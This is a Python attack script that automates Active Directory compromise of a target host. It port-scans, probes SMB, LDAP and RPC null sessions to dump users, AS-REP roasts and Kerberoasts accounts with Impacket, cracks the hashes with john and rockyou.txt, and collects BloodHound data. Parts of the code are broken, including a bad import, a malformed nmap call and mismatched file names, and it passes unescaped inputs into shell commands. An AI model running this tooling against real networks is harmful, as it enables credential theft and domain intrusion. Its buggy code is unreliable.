#!/usr/bin/env python3 

import os
import path
import argparse
import sys
import time
import subprocess
from subprocess import Popen
try:
    from colorama import Fore
except ImportError:
    os.system("pip3 install colorama")
    os.system("pip install colorama")

RED = Fore.RED
YELLOW = Fore.YELLOW
GREEN = Fore.GREEN
MAGENTA = Fore.MAGENTA
BLUE = Fore.BLUE
RESET = Fore.RESET

parser = argparse.ArgumentParser(description="Crackmapexec", formatter_class=argparse.ArgumentDefaultsHelpFormatter)
parser.add_argument("-r", "--RHOST", action="store", help="RHOST, -r 10.10.10.1 ; ex: 10.10.10.0/24")
parser.add_argument("-u", "--USERNAME", action="store", help="Username")
parser.add_argument("-p", "--PASSWORD", action="store", help="Password")
parser.add_argument("-I", "--IMPACKET", action="store_true", help="Run Impacket")
parser.add_argument("-B", "--BLOOD", action="store_true", help="Run Crackmapexec")
args = parser.parse_args()
parser.parse_args(args=None if sys.argv[1:] else ['--help'])

RHOST = args.RHOST
USERNAME = args.USERNAME
PASSWORD = args.PASSWORD
IMP = args.IMPACKET
BLOOD = args.BLOOD

def D():
    print(f"{YELLOW}Getting Domain Name and saving to domain_name.txt{RESET}")
    s = Popen([f"nxc smb {RHOST} > a.txt"], shell=True)
    s.wait()
    s = Popen([f"cut -d ':' -f 3 a.txt > b.txt"], shell=True)
    s.wait()
    s = Popen([f"cut -d ')' -f 1 b.txt > domain.txt"], shell=True)
    s.wait()
    s = Popen([f"cat domain.txt | sed 's/ //g' > domain1.txt"], shell=True)
    s.wait()
    s = Popen([f"cat domain1.txt | sed 's/ //g' > domain.txt"], shell=True)
    s.wait()
    s = Popen([f"tr -d '\n' < domain.txt > domain_name.txt"], shell=True)
    s.wait()
    with open ("domain_name.txt", "r") as f:
        content = f.read()
        print(f"{YELLOW}Domain name is {MAGENTA}{content}{RESET}")
    os.remove("a.txt")
    os.remove("b.txt")
    os.remove("domain1.txt")
    os.remove("domain.txt")

def R():
    print(f"{YELLOW}Running Rustscan and saving to ports.txt{RESET}\n")
    s = Popen([f"rustscan --ulimit 5000 -a {RHOST} -- -open -Pn > ports.txt"], shell=True)
    s.wait()
    with open("ports.txt", "r") as f:
        content = f.read()
        print(content)

def N():
    print(f"{YELLOW}Running NMAP on top 1000 ports and saving to ports.txt{RESET}\n")
    s = Popen([f"nmap -p -open {RHOST} -Pn > ports.txt"], shell=True)
    s.wait()

def SMB():
    with open("ports.txt", "r") as f:
        content = "445/tcp"
        file = f.read()
        if content in file:
            print(f"{YELLOW}SMB Running, trying NULL access{RESET}")
            s = Popen([f"nxc smb {RHOST} -u '' -p '' --shares > smb_anon.txt"], shell=True)
            s.wait()
            s = Popen([f"nxc smb {RHOST} -u fdhjasf -p fdhsaf --shares >> smb_anon.txt"], shell=True)
            s.wait()
            s = Popen([f"nxc smb {RHOST} -u anonymous -p '' --shares >> smb_anon.txt"], shell=True)
            s.wait()
            with open ("smb_anon.txt", "r") as f:
                content = f.read()
                word = "SYSVOL"
                if word in content:
                    print(f"\n{MAGENTA}*****{YELLOW}SMB {RED}NULL{YELLOW} session is enabled{MAGENTA}*****{RESET}")
                else:
                    print(f"{YELLOW}Doesn't look like NULL SMB login is allowed")
                    os.remove("smb_anon.txt")
def LDAP():
    with open("ports.txt", "r") as f:
        content = ("ldap")
        file = f.read()
        if content in file:
            print(f"\n{YELLOW}LDAP Running, trying NULL access{RESET}")
            path = "LDAP"
            if os.path.isdir(path) == False:
                os.mkdir("LDAP")
            s = Popen([f"cut -d '.' -f 1 domain_name.txt > d1.txt"], shell=True)
            s.wait()
            s = Popen([f"cut -d '.' -f 2 domain_name.txt > d2.txt"], shell=True)
            s.wait()
            os.chdir("LDAP")
            print(f"\n{YELLOW}Trying LDAP Domain Dump First{RESET}")
            s = Popen([f"ldapdomaindump ldap://{RHOST}:389"], shell=True)
            s.wait()
            os.chdir("..")
            print(f"\n{YELLOW}Trying LDAP Search{RESET}")
            with open ("d1.txt", "r") as f:
                d1=f.read()
            with open ("d2.txt", "r") as z:
                d2=z.read()
            s = Popen([f"ldapsearch -H ldap://{RHOST} -x -b 'DC={d1},DC={d2}' '(objectclass=person)' > ldap_dump.txt"], shell=True)
            s.wait()
            os.remove("d1.txt")
            os.remove("d2.txt")
            with open("ldap_dump.txt", "r") as f:
                content = f.read()
                word = "pwdLastSet"
                if word in content:
                    print(f"\n{MAGENTA}*****{YELLOW}LDAP {RED}NULL{YELLOW} session enabled{MAGENTA}*****{RESET}")
                    print(f"\n{YELLOW}Trying to dump only usernames then descriptions{RESET}")
                    s = Popen([f"cat ldap_dump.txt | grep -i 'samaccountname' > a.txt"], shell=True)
                    s.wait()
                    s = Popen([f"cut -d ':' -f 2 a.txt > b.txt"], shell=True)
                    s.wait()
                    s = Popen([f"cat b.txt | sed 's/ //g' > usernames.txt"], shell=True)
                    s.wait()
                    os.remove("a.txt")
                    os.remove("b.txt")
                    s = Popen([f"cat ldap_dump.txt | grep -i 'description' > ldap_description.txt"], shell=True)
                    s.wait()
                    print(f"\n{YELLOW}Dumping usernames.txt{RESET}")
                    with open("usernames.txt", "r") as f:
                        content = f.read()
                        print(content)
                    print(f"\n{YELLOW}Dumping ldap_description.txt{RESET}")
                    with open("ldap_description.txt", "r") as f:
                        content = f.read()
                        print(content)
                else:
                    print(f"\n{YELLOW}LDAP NULL session did not work{RESET}")

def ASREPLDAP():
    with open("domain_name.txt", "r") as f:
        content = f.read()
        answer = input(f"\n{MAGENTA}Please put Domain Name in /etc/hosts, press enter to continue Domain name is {RED}{content}{MAGENTA} with IP of {RED}{RHOST}\n")
        s = Popen([f"GetNPUsers.py '{content}/' -usersfile usernames.txt -no-pass -dc-ip {RHOST} > asrep_hash.txt"], shell=True)
        s.wait()
        with open("asrep_hash.txt", "r") as f:
            content = f.read()
            word = "krb5asrep"
            if word in content:
                print(f"{MAGENTA}*****{YELLOW}AsRepRoasting{YELLOW}{MAGENTA} looks like it worked*****{RESET}")
            else:
                os.remove("asrep_hash.txt")

def ASREPRPC():
    with open("domain_name.txt", "r") as f:
        content = f.read()
        answer = input(f"\n{MAGENTA}Please put Domain Name in /etc/hosts, press enter to continue Domain name is {RED}{content}{MAGENTA} with IP of {RED}{RHOST}\n")
        s = Popen([f"GetNPUsers.py '{content}/' -usersfile rpc_users.txt -no-pass -dc-ip {RHOST} > asrep_hash.txt"], shell=True)
        s.wait()
        with open("asrep_hash.txt", "r") as f:
            content = f.read()
            word = "krb5asrep"
            if word in content:
                print(f"{MAGENTA}*****{YELLOW}AsRepRoasting{YELLOW}{MAGENTA} looks like it worked*****{RESET}")
            else:
                os.remove("asrep_hash.txt")
def CRACK():
    with open("asrep_hash.txt", "r") as f:
        s = Popen([f"john asrep_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=krb5asrep --fork=4 > 1.txt"], shell=True)
        s.wait()
        with open("1.txt", "r") as f:
            content = f.read()
            word = "$krb5asrep$"
            if word in content:
                print(f"{RED}*****CRACKED*****{RESET}")
                print(content)
                s = Popen([f"tail -n +2 1.txt > a.txt"], shell=True)
                s.wait()
                s = Popen([f"cut -d '(' -f 1 a.txt > b.txt"], shell=True)
                s.wait()
                s = Popen([f"tail -n +1 b.txt > c.txt"], shell=True)
                s.wait()
                s = Popen([f"cat c.txt| sed 's/ //g' > d.txt"], shell=True)
                s.wait()
                s = Popen(["sed '/^[[:space:]]*$/d' d.txt > asrep_pass.txt"], shell=True)
                s.wait()
                s = Popen([f"cut -d '$' -f 4 a.txt > b.txt"], shell=True)
                s.wait()
                s = Popen([f"cut -d '@' -f 1 b.txt > asrep_users.txt"], shell=True)
                s.wait()
                os.remove("a.txt")
                os.remove("b.txt")
                os.remove("c.txt")
                os.remove("d.txt")
                os.remove("1.txt")
                with open("asrep_users.txt", "r") as f:
                    content = f.read()
                    with open("asrep_pass.txt", "r") as z:
                        content1 = z.read()
                        print(f"\n{YELLOW}Cracked username is \n{RED}{content}{YELLOW}\nWith password \n{RED}{content1}{RESET}\n")
def SPN():
    with open("ker_users.txt", "r") as f:
        content = f.read()
    with open("asrep_pass.txt", "r") as z:
        content1 = z.read()
    with open("domain_name.txt", "r") as x:
        content2 = x.read()
    s = Popen([f"GetUserSPNs.py '{content2}/{content}:{content1}' -request > spn_hash.txt"], shell=True)
    s.wait()
    with open("spn_hash.txt", "r") as f:
        content = f.read()
        word = "$krb5tgs$"
        if word in content:
            print(f"{MAGENTA}*****{YELLOW}SPNs{YELLOW}{MAGENTA} looks like it worked*****{RESET}")
            print(content)
            print(f"{YELLOW}Trying to grab just Service Account Names{RESET}")
            s = Popen([f"cut -d '$' -f 1 spn_hash.txt > a.txt"], shell=True)
            s.wait()
            s = Popen([f"cut -d '[' -f 1 a.txt > b.txt"], shell=True)
            s.wait()
            s = Popen([f"tail -n +5 b.txt > spn_users.txt"], shell=True)
            s.wait()
            with open("spn_users.txt", "r") as f:
                content = f.read()
                print(content)
            os.remove("a.txt")
            os.remove("b.txt")

def CRACK1():
    s = Popen([f"john spn_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --fork=4 --format=krb5tgs > a.txt"], shell=True)
    s.wait()
    s = Popen([f"tail -n +2 a.txt > spn_pass.txt"], shell=True)
    s.wait()
    with open("spn_pass.txt", "r") as f:
        content = f.read()
        print(f"{YELLOW}Cracked passwords if any are below{RESET}")
        print(f"{RED}{content}")
    os.remove("a.txt")

def RPC():
    with open("ports.txt", "r") as f:
        content = f.read()
        word = "135/tcp"
        if word in content:
            print(f"{YELLOW}Checking if RPC has NULL sessions")
            s = Popen([f"rpcclient -U '' -N {RHOST} -c 'enumdomusers' > rpc_users.txt"], shell=True)
            s.wait()
            with open("rpc_users.txt", "r") as f:
                content = f.read()
                word = "NT_STATUS_ACCESS_DENIED"
                if word in content:
                    print(f"\n{YELLOW}NULL RPC not allowed\n{RESET}")
                    os.remove("rpc_users.txt")
                else:
                    print(f"\n{YELLOW}Looks like NULL {RED}RPC{YELLOW} is allowed, dumping users\n{RESET}")
                    s = Popen([f"cut -d '[' -f 2 rpc_users.txt > a.txt"], shell=True)
                    s.wait()
                    s = Popen([f"cut -d ']' -f 1 a.txt > b.txt"], shell=True)
                    s.wait()
                    s = Popen([f"cat b.txt | sed 's/ //g' > rpc_users.txt"], shell=True)
                    s.wait()
                    os.remove("a.txt")
                    os.remove("b.txt")
                    with open("rpc_users.txt", "r"):
                        content = f.read()
                        print (content)

def RPCDES():
    print(f"{YELLOW}Running against rpc_users.txt file{RESET}")
    with open ("rpc_users.txt") as f:
        line = f.readline()
        cnt = 0
        while line:
            s = Popen([f'rpcclient -U "" -N -c "queryuser {line}" {RHOST} >> rpc_des.txt'], shell=True)
            s.wait()
            cnt += 1
            line = f.readline()
            print("rpc_des.txt")
    with open ("rpc_des.txt", "r") as f:
        content = "Description"
        file = f.read()
        if content in file:
            s = Popen([f'cat rpc_des.txt | grep -i Description'], shell=True)
            s.wait()

def SMBANONCRACK():
    s = Popen([f"nxc smb {RHOST} -u '' -p '' --shares --users --groups >> smb_anon.txt"], shell=True)
    s.wait()
    s = Popen([f"nxc smb {RHOST} -u anonymous -p '' --shares --users --groups >> smb_anon.txt"], shell=True)
    s.wait()
    s = Popen([f"nxc smb {RHOST} --shares --users --groups >> smb_anon.txt"], shell=True)
    s.wait()
    with open("smb_anon.txt", "r") as f:
        content = f.read()
        print(content)

def SMBWUP():
    with open("ports.txt", "r") as f:
        content = f.read()
        word = "445/tcp"
        if word in content:
            print(f"{YELLOW}Enumerating SMB and saving to smb.txt{RESET}")
            s = Popen([f"nxc smb {RHOST} -u {USERNAME} -p {PASSWORD} --shares --users --groups >> smb.txt"], shell=True)
            s.wait()
            with open("smb.txt", "r") as f:
                content = f.read()
                print(content)

def SPNWUP():
    with open("domain_name.txt", "r") as x:
        content2 = x.read()
    s = Popen([f"GetUserSPNs.py '{content2}/{USERNAME}:{PASSWORD}' -request > spn_hash.txt"], shell=True)
    s.wait()
    with open("spn_hash.txt", "r") as f:
        content = f.read()
        word = "$krb5tgs$"
        if word in content:
            print(f"{MAGENTA}*****{YELLOW}SPNs{YELLOW}{MAGENTA} looks like it worked*****{RESET}")
            print(content)
            print(f"{YELLOW}Trying to grab just Service Account Names{RESET}")
            s = Popen([f"cut -d '$' -f 1 spn_hash.txt > a.txt"], shell=True)
            s.wait()
            s = Popen([f"cut -d '[' -f 1 a.txt > b.txt"], shell=True)
            s.wait()
            s = Popen([f"tail -n +5 b.txt > spn_users.txt"], shell=True)
            s.wait()
            with open("spn_users.txt", "r") as f:
                content = f.read()
                print(content)
            os.remove("a.txt")
            os.remove("b.txt")
            
def SIDWUP():
    print(f"{YELLOW}Looking up SIDs and printing to sid.txt{RESET}")
    with open ("domain_name.txt", "r") as f:
        content = f.read()
    s = Popen([f"lookupsid.py '{content}/{USERNAME}:{PASSWORD}'@{RHOST} > sid_users.txt"], shell=True)
    s.wait()
    with open ("sid_users.txt", "r") as f:
        content = f.read()
        print(content)
    s = Popen([f"cut -d '\\' -f 2 sid_users.txt > a.txt"], shell=True)
    s.wait()
    s = Popen([f"cut -d '(' -f 1 a.txt > b.txt"], shell=True)
    s.wait()
    s = Popen([f"cat b.txt | sed 's/ //g' > sid.txt"], shell=True)
    s.wait()    
    with open ("sid.txt", "r") as f:
        content = f.read()
        print(content)
    os.remove("sid_users.txt")
    os.remove("a.txt")
    os.remove("b.txt")

if RHOST == False:
    print(f"{RED}NEED RHOST{RESET}")
    exit()

if USERNAME is None and PASSWORD is None:
    path = './ports.txt'
    check_file = os.path.isfile(path)
    if check_file == True:
        check = input(f"\n{RED}ports.txt already exists, overwrite (y/n):\n{RESET}")
        if check == "y":
            rust = input(f"{RED}Rustscan or NMAP (r/n):\n{RESET}")
            if rust == "r":
                R()
            if rust == "n":
                N()
    else:
        rust = input(f"{RED}Rustscan or NMAP (r/n):\n{RESET}")
        if rust == "r":
            R()
        if rust == "n":
            N()
    D()
    SMB()
    path = './smb_anon.txt'
    check_file = os.path.isfile(path)
    if check_file == True:
        check = input(f"\n{RED}Try and dump users, groups and shares (y/n){RESET}\n")
        if check == "y":
            SMBANONCRACK()
    RPC()
    path = './rpc_users.txt'
    check_file = os.path.isfile(path)
    if check_file == True:
        check = input(f"\n{RED}Would you like to try AsRepRoasting against users found in RPC (y/n){RESET}\n")
        if check == "y":
            ASREPRPC()
            path = './asrep_hash.txt'
            check_file = os.path.isfile(path)
            if check_file == True:
                check = input(f"\n{RED}Would you like to try and crack the hashes (y/n){RESET}\n")      
                if check == "y":
                    CRACK()
    path = './rpc_users.txt'
    check_file = os.path.isfile(path)
    if check_file == True:
        check = input(f"{RED}Would you like to look at descriptions for RPC, this can take a while especially on a large network (y/n) \n{RESET}")
        if check == "y":
            RPCDES()
    LDAP()
    path = './usernames.txt'
    check_file = os.path.isfile(path)
    if check_file == True:
        check = input(f"\n{RED}Would you like to try AsRepRoasting against users found in LDAP (y/n){RESET}\n")
        if check == "y":
            ASREPLDAP()
            path = './asrep_hash.txt'
            check_file = os.path.isfile(path)
            if check_file == True:
                check = input(f"\n{RED}Would you like to try and crack the hashes (y/n){RESET}\n")      
                if check == "y":
                    CRACK()
    exit()

if USERNAME is not False and PASSWORD is not False:
    print(f"\n{YELLOW}Enumerating system with username {RED}{USERNAME}{YELLOW} and password {RED}{PASSWORD}{RESET}") 
    path = './ports.txt'
    check_file = os.path.isfile(path)
    if check_file == True:
        check = input(f"\n{RED}ports.txt already exists, overwrite (y/n):\n{RESET}")
        if check == "y":
            rust = input(f"{RED}Rustscan or NMAP (r/n):\n{RESET}")
            if rust == "r":
                R()
            if rust == "n":
                N()
    else:
        rust = input(f"{RED}Rustscan or NMAP (r/n):\n{RESET}")
        if rust == "r":
            R()
        if rust == "n":
            N()
    D()
    SMBWUP()
    SPNWUP()
    SIDWUP()

if BLOOD == True:
    print(f"{YELLOW}Running bloodhound as user {RED}{USERNAME}{YELLOW} with password {RED}{PASSWORD}{RESET}")
    path = 'Blood'
    check_path = os.path.isdir(path)
    if check_path == True:
        os.chdir(path)
    else:
        os.mkdir(path)
        os.chdir(path)
    with open("../domain_name.txt", "r") as f:
        content = f.read()
    s = Popen([f"bloodhound-python -d {content} -u {USERNAME} -p {PASSWORD} -c all -ns {RHOST}"], shell=True)
    s.wait()

if IMP == True:
    D()
    path = './ker_users.txt'
    check_file = os.path.isfile(path)
    if check_file == True:
        check = input(f"\n{RED}Would you like to try Kerberoasting for Service Accounts (y/n)\n{RESET}")
        if check == "y":
            SPN()
            path = './hash.txt'
            check_file = os.path.isfile(path)
            if check_file == True:
                check = input(f"\n{RED}Would you like to try and crack Kerberos hash (y/n)\n{RESET}")
                if check == "y":
                    CRACK1()
